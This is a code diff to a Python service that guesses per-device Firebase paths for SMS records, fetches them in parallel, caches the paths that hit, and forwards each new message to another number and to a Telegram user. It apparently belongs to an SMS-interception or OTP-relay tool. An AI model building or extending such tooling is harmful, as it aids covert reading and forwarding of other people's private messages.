@@ -40,7 +40,10 @@ TIME_FIELDS = ("time", "date", "timestamp", "ts", "received_at", "created_at", "
 SEEN_META_KEY = "firebase_sms_seen"
 BASELINE_META_KEY = "firebase_sms_baseline"
 BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
+SMS_PATHS_META_KEY = "firebase_sms_paths"
 MAX_SEEN_KEYS = 20000
+MAX_CACHED_SMS_PATHS = 50
+FETCH_CONCURRENCY = 25
 BODY_DATE_RE = re.compile(
     r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})(?:\s+\d{1,2}:\d{2})?\b"
 )
@@ -282,6 +285,89 @@ async def _fetch_path_records(root: str, path: str, timeout: float) -> list[dict
     return records
 
 
+def _generate_sms_paths(device: Device) -> list[str]:
+    paths: list[str] = []
+    seen_paths: set[str] = set()
+
+    for device_id in _device_ids(device):
+        for parent in SMS_PARENT_PATHS:
+            for child in SMS_CHILD_PATHS:
+                path = f"{parent}/{device_id}/{child}"
+                if path not in seen_paths:
+                    seen_paths.add(path)
+                    paths.append(path)
+
+            device_path = f"{parent}/{device_id}"
+            if device_path not in seen_paths:
+                seen_paths.add(device_path)
+                paths.append(device_path)
+
+        for top in ("sms", "SMS", "messages"):
+            path = f"{top}/{device_id}"
+            if path not in seen_paths:
+                seen_paths.add(path)
+                paths.append(path)
+
+    return paths
+
+
+def get_cached_sms_paths(device: Device) -> list[str]:
+    meta = _meta_dict(device)
+    cached = meta.get(SMS_PATHS_META_KEY) or []
+    if isinstance(cached, list):
+        return [str(path) for path in cached if path]
+    return []
+
+
+def set_cached_sms_paths(device: Device, paths: list[str]) -> None:
+    if not paths:
+        return
+    meta = _meta_dict(device)
+    meta[SMS_PATHS_META_KEY] = list(dict.fromkeys(paths))[:MAX_CACHED_SMS_PATHS]
+    _save_meta(device, meta)
+
+
+async def _fetch_paths_parallel(
+    root: str,
+    paths: list[str],
+    *,
+    timeout: float,
+) -> tuple[list[dict[str, Any]], list[str]]:
+    if not paths:
+        return [], []
+
+    semaphore = asyncio.Semaphore(FETCH_CONCURRENCY)
+
+    async def fetch_one(path: str) -> tuple[str, list[dict[str, Any]]]:
+        async with semaphore:
+            records = await _fetch_path_records(root, path, timeout)
+            return path, records
+
+    results = await asyncio.gather(
+        *[fetch_one(path) for path in paths],
+        return_exceptions=True,
+    )
+
+    all_records: list[dict[str, Any]] = []
+    hit_paths: list[str] = []
+    for result in results:
+        if isinstance(result, Exception):
+            continue
+        path, records = result
+        if records:
+            hit_paths.append(path)
+            all_records.extend(records)
+
+    return all_records, hit_paths
+
+
+def _dedupe_records(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
+    deduped: dict[str, dict[str, Any]] = {}
+    for record in records:
+        deduped[record["firebase_key"]] = record
+    return list(deduped.values())
+
+
 async def fetch_firebase_sms_for_device(
     firebase_url: str,
     device: Device,
@@ -289,33 +375,23 @@ async def fetch_firebase_sms_for_device(
     timeout: float = 3.0,
 ) -> list[dict[str, Any]]:
     root = firebase_root_url(firebase_url)
-    all_records: list[dict[str, Any]] = []
-    seen_paths: set[str] = set()
+    cached_paths = get_cached_sms_paths(device)
+    if cached_paths:
+        cached_records, hit_paths = await _fetch_paths_parallel(
+            root,
+            cached_paths,
+            timeout=timeout,
+        )
+        if cached_records:
+            if hit_paths:
+                set_cached_sms_paths(device, hit_paths)
+            return _dedupe_records(cached_records)
 
-    for device_id in _device_ids(device):
-        for parent in SMS_PARENT_PATHS:
-            for child in SMS_CHILD_PATHS:
-                path = f"{parent}/{device_id}/{child}"
-                if path in seen_paths:
-                    continue
-                seen_paths.add(path)
-                all_records.extend(await _fetch_path_records(root, path, timeout))
-
-            device_path = f"{parent}/{device_id}"
-            if device_path not in seen_paths:
-                seen_paths.add(device_path)
-                all_records.extend(await _fetch_path_records(root, device_path, timeout))
-
-        for top in ("sms", "SMS", "messages"):
-            path = f"{top}/{device_id}"
-            if path not in seen_paths:
-                seen_paths.add(path)
-                all_records.extend(await _fetch_path_records(root, path, timeout))
-
-    deduped: dict[str, dict[str, Any]] = {}
-    for record in all_records:
-        deduped[record["firebase_key"]] = record
-    return list(deduped.values())
+    all_paths = _generate_sms_paths(device)
+    all_records, hit_paths = await _fetch_paths_parallel(root, all_paths, timeout=timeout)
+    if hit_paths:
+        set_cached_sms_paths(device, hit_paths)
+    return _dedupe_records(all_records)
 
 
 async def snapshot_firebase_sms_seen(
@@ -403,90 +479,130 @@ async def _inject_before_notify(profile: MonitorProfile, device: Device, sender:
     await forward_incoming_to_mynum(None, profile, device, sender, message)
 
 
-async def poll_monitoring_profiles_once() -> int:
+async def _inject_and_stream_dm(
+    telegram_user_id: int,
+    sender: str,
+    message: str,
+) -> None:
+    import time
+
+    from app.telegram_notify import send_inject_stream_dm
+
+    db = SessionLocal()
+    try:
+        profile = get_monitor_profile(db, telegram_user_id)
+        device = get_active_device(db, telegram_user_id)
+        if not profile or not device:
+            return
+
+        t0 = time.perf_counter()
+        try:
+            await _inject_before_notify(profile, device, sender, message)
+        except Exception as exc:
+            logger.warning("Fast inject failed for %s: %s", device.name, exc)
+        relay_ms = max(1, int((time.perf_counter() - t0) * 1000))
+    finally:
+        db.close()
+
+    await send_inject_stream_dm(telegram_user_id, sender, message, relay_ms)
+
+
+async def _poll_one_monitoring_profile(profile_id: int) -> int:
     db = SessionLocal()
     processed = 0
     try:
-        profiles = db.query(MonitorProfile).filter(MonitorProfile.is_monitoring.is_(True)).all()
-        for profile in profiles:
-            device = get_active_device(db, profile.telegram_user_id)
-            if not device:
-                continue
-            firebase_url = _resolve_device_firebase_url(profile, device)
-            if not firebase_url:
-                continue
+        profile = db.query(MonitorProfile).filter(MonitorProfile.id == profile_id).first()
+        if not profile or not profile.is_monitoring:
+            return 0
 
-            if not baseline_ready(device, profile):
-                continue
+        device = get_active_device(db, profile.telegram_user_id)
+        if not device:
+            return 0
 
-            try:
-                records = await asyncio.wait_for(
-                    fetch_firebase_sms_for_device(
-                        firebase_url,
-                        device,
-                        timeout=POLL_FETCH_TIMEOUT_SEC,
-                    ),
-                    timeout=POLL_FETCH_TIMEOUT_SEC + 2,
-                )
-            except (asyncio.TimeoutError, httpx.HTTPError, Exception) as exc:
-                logger.debug("Firebase SMS poll failed for %s: %s", device.name, exc)
-                continue
+        firebase_url = _resolve_device_firebase_url(profile, device)
+        if not firebase_url or not baseline_ready(device, profile):
+            return 0
 
-            seen = get_seen_sms_keys(device) | get_baseline_sms_keys(device)
-            new_records = [r for r in records if r["firebase_key"] not in seen]
+        try:
+            records = await asyncio.wait_for(
+                fetch_firebase_sms_for_device(
+                    firebase_url,
+                    device,
+                    timeout=POLL_FETCH_TIMEOUT_SEC,
+                ),
+                timeout=POLL_FETCH_TIMEOUT_SEC + 2,
+            )
+        except (asyncio.TimeoutError, httpx.HTTPError, Exception) as exc:
+            logger.debug("Firebase SMS poll failed for %s: %s", device.name, exc)
+            return 0
 
-            if not new_records:
-                continue
+        seen = get_seen_sms_keys(device) | get_baseline_sms_keys(device)
+        new_records = [record for record in records if record["firebase_key"] not in seen]
+        if not new_records:
+            return 0
 
-            new_keys: set[str] = set()
-            for record in sorted(
-                new_records,
-                key=lambda item: item.get("received_at") or datetime.min.replace(tzinfo=timezone.utc),
-            ):
-                if _is_old_for_monitoring(record, profile):
-                    new_keys.add(record["firebase_key"])
-                    continue
-
-                received_at = record.get("received_at")
-                sender = record["sender"]
-                message = record["message"]
-                if _is_outgoing_firebase_log(sender, message):
-                    new_keys.add(record["firebase_key"])
-                    continue
-
-                import time
-
-                t0 = time.perf_counter()
-                try:
-                    await _inject_before_notify(profile, device, sender, message)
-                except Exception as exc:
-                    logger.warning("Fast inject failed for %s: %s", device.name, exc)
-                relay_ms = max(1, int((time.perf_counter() - t0) * 1000))
-
-                sms = save_sms(
-                    db,
-                    sender=sender,
-                    message=message,
-                    device_name=device.name,
-                    received_at=received_at,
-                )
-                db.commit()
+        new_keys: set[str] = set()
+        for record in sorted(
+            new_records,
+            key=lambda item: item.get("received_at") or datetime.min.replace(tzinfo=timezone.utc),
+        ):
+            if _is_old_for_monitoring(record, profile):
                 new_keys.add(record["firebase_key"])
-                processed += 1
+                continue
 
-                import asyncio
+            received_at = record.get("received_at")
+            sender = record["sender"]
+            message = record["message"]
+            if _is_outgoing_firebase_log(sender, message):
+                new_keys.add(record["firebase_key"])
+                continue
 
-                from app.telegram_bot import send_inject_stream_dm
+            asyncio.create_task(
+                _inject_and_stream_dm(profile.telegram_user_id, sender, message)
+            )
 
-                asyncio.create_task(
-                    send_inject_stream_dm(profile.telegram_user_id, sender, message, relay_ms)
-                )
+            save_sms(
+                db,
+                sender=sender,
+                message=message,
+                device_name=device.name,
+                received_at=received_at,
+            )
+            db.commit()
+            new_keys.add(record["firebase_key"])
+            processed += 1
 
-            if new_keys:
-                mark_sms_keys_seen(device, new_keys)
-                db.commit()
+        if new_keys:
+            mark_sms_keys_seen(device, new_keys)
+            db.commit()
     finally:
         db.close()
+    return processed
+
+
+async def poll_monitoring_profiles_once() -> int:
+    db = SessionLocal()
+    try:
+        profile_ids = [
+            profile.id
+            for profile in db.query(MonitorProfile).filter(MonitorProfile.is_monitoring.is_(True)).all()
+        ]
+    finally:
+        db.close()
+
+    if not profile_ids:
+        return 0
+
+    results = await asyncio.gather(
+        *[_poll_one_monitoring_profile(profile_id) for profile_id in profile_ids],
+        return_exceptions=True,
+    )
+    processed = 0
+    for result in results:
+        if isinstance(result, Exception):
+            logger.debug("Profile poll task failed: %s", result)
+            continue
+        processed += int(result)
     return processed
 
 
